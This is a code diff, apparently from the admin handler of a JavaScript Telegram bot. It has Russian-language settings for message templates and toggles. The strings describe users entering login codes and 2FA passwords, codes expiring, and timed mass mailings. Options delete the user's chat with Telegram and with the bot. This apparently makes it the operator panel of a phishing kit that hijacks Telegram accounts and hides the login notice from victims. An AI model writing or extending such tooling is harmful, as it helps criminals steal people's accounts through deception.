@@ -60,7 +60,7 @@ export default {
                 chat_id: query.message.chat.id
             })
         }
-        if(action === 'deleteTelegram' || action === 'deleteBot' || action === 'mailingUnauth') {
+        if(action === 'deleteTelegram' || action === 'deleteBot') {
             const templateDoc = await template.findOne({ id });
             let fieldValue;
             let buttonConfig;
@@ -69,7 +69,7 @@ export default {
                 case 'deleteTelegram':
                     fieldValue = !templateDoc.deleteTelegram;
                     buttonConfig = {
-                        index: [10, 0],
+                        index: [11, 0],
                         text: `🔇 Удалить чат с telegram ${fieldValue ? '🟢' : '🔴'}`,
                         field: 'deleteTelegram'
                     };
@@ -77,19 +77,12 @@ export default {
                 case 'deleteBot':
                     fieldValue = !templateDoc.deleteBot;
                     buttonConfig = {
-                        index: [9, 0],
+                        index: [10, 0],
                         text: `🤖 Удалить чат с ботом ${fieldValue ? '🟢' : '🔴'}`,
                         field: 'deleteBot'
                     };
                     break;
-                case 'mailingUnauth':
-                    fieldValue = !templateDoc.mailingUnauth;
-                    buttonConfig = {
-                        index: [8, 0],
-                        text: `🎉 Сообщение после авторизации ${fieldValue ? '🟢' : '🔴'}`,
-                        field: 'mailingUnauth'
-                    };
-                    break;
+              
             }
 
             // Обновляем значение в базе данных
@@ -145,11 +138,17 @@ export default {
                 description: 'Пользователь ввел неверно код. 5 секунд он ждёт. (до 3-х попыток)',
                 value: t[action]
             },
+            // auth: {
+            //     title: '♻️ Сообщение проверки кода',
+            //     description: 'Пользователь ввел код и ждёт проверки.',
+            //     value: t[action]
+            // },   
             timeout: {
-                title: '♻️ Сообщение проверки кода',
-                description: 'Пользователь ввел код и ждёт проверки.',
+                title: '⏰ Сообщение если код просрочен',
+                description: 'Код действителен 5 минут, если он не был введен отправляется оповещение.',
                 value: t[action]
             },
+            
             error: {
                 title: '🚫 Сообщение при ошибке отправки кода',
                 description: 'В менеджере бывают разные баги. Так что просим ждать пользователя 30 секунд для повторного кода.',
@@ -171,6 +170,7 @@ export default {
                 description: 'Отправляется пользователю в случае неверного пароля от 2FA. (дается 3 попытки)',
                 value: t[action]
             },
+            
             mailing1h: {
                 title: '📣 Авто.Рассылка',
                 description: 'Сообщения отправляются автоматически спустя 5/10/30/60/120 минут. Выберите формант рассылки пользователям.',
